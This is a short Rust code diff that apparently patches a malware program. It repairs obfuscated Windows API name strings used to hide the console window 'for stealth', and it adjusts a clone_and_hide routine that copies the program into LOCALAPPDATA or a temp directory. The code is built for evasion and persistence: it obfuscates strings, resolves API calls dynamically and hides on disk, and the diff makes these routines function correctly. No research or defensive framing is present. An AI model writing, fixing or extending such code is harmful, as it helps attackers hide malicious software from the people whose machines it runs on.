@@ -8,10 +8,10 @@ pub fn hide_console() {
         
         // Dynamic resolution for stealth
         unsafe {
-            let kernel32_name = crate::utils::decode_obf(&crate::obf_str!("kernel32.dll"));
-            let user32_name = crate::utils::decode_obf(&crate::obf_str!("user32.dll"));
-            let get_console_window_name = crate::utils::decode_obf(&crate::obf_str!("GetConsoleWindow"));
-            let show_window_name = crate::utils::decode_obf(&crate::obf_str!("ShowWindow"));
+            let kernel32_name = crate::utils::decode_obf(&crate::obf_str!("kernel32.dll\0"));
+            let user32_name = crate::utils::decode_obf(&crate::obf_str!("user32.dll\0"));
+            let get_console_window_name = crate::utils::decode_obf(&crate::obf_str!("GetConsoleWindow\0"));
+            let show_window_name = crate::utils::decode_obf(&crate::obf_str!("ShowWindow\0"));
 
             let h_kernel32 = winapi::um::libloaderapi::GetModuleHandleA(kernel32_name.as_ptr() as *const i8);
             let h_user32 = winapi::um::libloaderapi::LoadLibraryA(user32_name.as_ptr() as *const i8);
@@ -149,8 +149,8 @@ pub fn clone_and_hide() -> bool {
     }
 
     let mut target_path = if cfg!(windows) {
-        let appdata_var = crate::utils::decode_obf(&crate::obf_str!("LOCALAPPDATA"));
-        let appdata = env::var(appdata_var).unwrap_or_else(|_| crate::utils::decode_obf(&crate::obf_str!("C:\\Windows\\Temp")));
+        let appdata_var = crate::utils::decode_obf(&crate::obf_str!("LOCALAPPDATA\0"));
+        let appdata = env::var(appdata_var.trim_matches('\0')).unwrap_or_else(|_| crate::utils::decode_obf(&crate::obf_str!("C:\\Windows\\Temp")));
         PathBuf::from(appdata)
     } else {
         PathBuf::from(crate::utils::decode_obf(&crate::obf_str!("/tmp")))
